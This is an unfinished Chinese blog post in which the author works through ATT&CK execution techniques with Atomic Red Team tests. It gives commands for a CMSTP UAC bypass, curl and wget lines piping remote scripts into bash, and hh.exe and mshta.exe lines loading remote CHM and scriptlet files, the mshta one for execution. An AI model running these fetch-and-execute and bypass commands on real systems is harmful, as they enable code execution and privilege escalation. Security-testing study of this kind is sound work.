---
layout: post
title: 跟着ATT&CK学安全之execution
excerpt: "跟着ATT&CK学安全之execution"
categories: [未完待续]
comments: true
---
#### T1191 - CMSTP

平台:Windows
运行方式如下`cmstp.exe /s T1191.inf`

`cmstp.exe /s T1191_uacbypass.inf /au`

#### T1059 - Command-Line Interface

平台:macOS, CentOS, Ubuntu, Linux

运行如下命令
```bash
bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
```
#### T1223 - Compiled HTML File
运行如下命令
```
hh.exe D:\pycharmproject\atomic-red-team-master\atomics\T1223\src\T1223.chm
```
或者
```
hh.exe http://snappyzz.com/T1223.chm		#这个无法使用,正在解决中
```
#### T1170 - Mshta
```
mshta.exe javascript:a=(GetObject("script:http://snappyzz.com/mshta.sct")).Exec();close();
```
或者
```
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""C:\Windows\SysWOW64\calc.exe"")(window.close)")
```
#### T1086 - PowerShell
